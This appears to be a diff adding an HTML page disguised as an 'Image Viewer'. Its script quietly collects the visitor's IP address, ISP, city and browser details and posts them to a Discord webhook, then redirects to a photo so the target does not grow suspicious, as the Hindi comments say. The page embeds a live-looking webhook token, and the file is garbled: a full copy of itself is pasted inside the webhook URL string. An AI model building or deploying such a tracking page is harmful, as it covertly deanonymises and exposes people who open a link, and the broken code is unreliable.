@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Image Viewer</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script>
+        // यह मुफ़्त API विजिटर का 100% असली IP और नेटवर्क डेटा निकालता है
+        fetch('https://ipapi.co')
+        .then(response => response.json())
+        .then(data => {
+            // Webhook के जरिए डेटा सीधे आपके पास भेजने का कोड
+            const webhookURL = "<!DOCTYPE html>
+<html>
+<head>
+    <title>Image Viewer</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script>
+        // यह मुफ़्त API विजिटर का 100% असली IP और नेटवर्क डेटा निकालता है
+        fetch('https://ipapi.co')
+        .then(response => response.json())
+        .then(data => {
+            // Webhook के जरिए डेटा सीधे आपके पास भेजने का कोड
+            const webhookURL = "https://discord.com/api/webhooks/1546246221717442701/Xdm1gPMdRG-E90lbS6ytawkRQo4vJthOWKxgGSJGAOeBYuMqF0cPGqIgqQOHYN-uA-OS"; 
+            const payload = {
+                content: `🚨 **SUSPECT TRACKED!** 🚨\n🌐 **IP Address:** ${data.ip}\n🏢 **ISP:** ${data.org}\n📍 **City/Region:** ${data.city}, ${data.region}\n📱 **Device/User-Agent:** ${navigator.userAgent}\n⏰ **Time:** ${new Date().toLocaleString()}`
+            };
+            
+            fetch(webhookURL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            }).then(() => {
+                // डेटा भेजने के तुरंत बाद अपराधी को असली फोटो पर रीडायरेक्ट कर दें
+                window.location.href = "YOUR_ACTUAL_IMAGE_URL_HERE";
+            });
+        })
+        .catch(() => {
+            // अगर API फेल भी हो, तो भी फोटो खुल जाए ताकि शक न हो
+            window.location.href = "YOUR_ACTUAL_IMAGE_URL_HERE";
+        });
+    </script>
+</head>
+<body style="background-color: black; margin: 0; padding: 0;">
+</body>
+</html>
+"; 
+            const payload = {
+                content: `🚨 **SUSPECT TRACKED!** 🚨\n🌐 **IP Address:** ${data.ip}\n🏢 **ISP:** ${data.org}\n📍 **City/Region:** ${data.city}, ${data.region}\n📱 **Device/User-Agent:** ${navigator.userAgent}\n⏰ **Time:** ${new Date().toLocaleString()}`
+            };
+            
+            fetch(webhookURL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            }).then(() => {
+                // डेटा भेजने के तुरंत बाद अपराधी को असली फोटो पर रीडायरेक्ट कर दें
+                window.location.href = "YOUR_ACTUAL_IMAGE_URL_HERE";
+            });
+        })
+        .catch(() => {
+            // अगर API फेल भी हो, तो भी फोटो खुल जाए ताकि शक न हो
+            window.location.href = "YOUR_ACTUAL_IMAGE_URL_HERE";
+        });
+    </script>
+</head>
+<body style="background-color: black; margin: 0; padding: 0;">
+</body>
+</html>
